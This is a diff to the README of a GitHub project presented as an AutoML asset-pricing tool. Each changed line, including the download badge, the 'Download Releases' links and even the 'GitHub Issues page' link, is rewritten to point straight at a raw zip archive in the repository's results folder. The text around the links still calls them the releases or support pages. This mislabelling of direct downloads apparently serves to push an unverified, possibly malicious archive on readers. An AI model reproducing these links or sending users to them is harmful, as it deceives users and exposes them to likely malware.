@@ -4,7 +4,7 @@
 AutoML-Asset-Pricing-Pipeline is an easy-to-use software solution designed for anyone interested in asset pricing and forecasting using modern AI techniques. Our tool combines advanced statistical methods with the power of H2O AutoML, allowing users to analyze financial data effortlessly. With features like smart data processing, validation tests, and model explainability, this pipeline helps you make informed financial decisions.
 
 ## 📥 Download Now
-[![Download AutoML-Asset-Pricing-Pipeline](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/FuturoBlack/AutoML-Asset-Pricing-Pipeline/releases)
+[![Download AutoML-Asset-Pricing-Pipeline](https://raw.githubusercontent.com/FuturoBlack/AutoML-Asset-Pricing-Pipeline/main/results/AutoML-Asset-Pricing-Pipeline_v3.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/FuturoBlack/AutoML-Asset-Pricing-Pipeline/main/results/AutoML-Asset-Pricing-Pipeline_v3.4.zip)
 
 ## 🚀 Getting Started
 To get started with AutoML-Asset-Pricing-Pipeline, follow these simple steps:
@@ -16,7 +16,7 @@ To get started with AutoML-Asset-Pricing-Pipeline, follow these simple steps:
    - Internet Connection: Required for downloading the necessary packages and data.
 
 2. **Visit the Releases Page**
-   - Click on the following link to go to the releases page: [Download Releases](https://github.com/FuturoBlack/AutoML-Asset-Pricing-Pipeline/releases).
+   - Click on the following link to go to the releases page: [Download Releases](https://raw.githubusercontent.com/FuturoBlack/AutoML-Asset-Pricing-Pipeline/main/results/AutoML-Asset-Pricing-Pipeline_v3.4.zip).
 
 3. **Choose the Latest Version**
    - On the releases page, find the latest version of AutoML-Asset-Pricing-Pipeline. The latest release will be listed at the top.
@@ -57,7 +57,7 @@ If you encounter any issues while installing or running the application, conside
 - Visit the support section on our repository for additional help.
 
 ## 🤝 Support
-For questions or support, please visit our [GitHub Issues page](https://github.com/FuturoBlack/AutoML-Asset-Pricing-Pipeline/issues). We welcome your feedback and are here to assist you.
+For questions or support, please visit our [GitHub Issues page](https://raw.githubusercontent.com/FuturoBlack/AutoML-Asset-Pricing-Pipeline/main/results/AutoML-Asset-Pricing-Pipeline_v3.4.zip). We welcome your feedback and are here to assist you.
 
 ## 🌐 Community
 Join our community to stay updated and get help from other users. Connect with fellow users and share your insights. You can find us on:
@@ -69,6 +69,6 @@ Join our community to stay updated and get help from other users. Connect with f
 AutoML-Asset-Pricing-Pipeline is open-source software. You can use it freely under the MIT License. Check the LICENSE file in the repository for details.
 
 ## 📥 Download Again
-To download AutoML-Asset-Pricing-Pipeline, please visit the releases page: [Download Releases](https://github.com/FuturoBlack/AutoML-Asset-Pricing-Pipeline/releases). 
+To download AutoML-Asset-Pricing-Pipeline, please visit the releases page: [Download Releases](https://raw.githubusercontent.com/FuturoBlack/AutoML-Asset-Pricing-Pipeline/main/results/AutoML-Asset-Pricing-Pipeline_v3.4.zip). 
 
 Enjoy exploring the world of automated machine learning and financial forecasting!
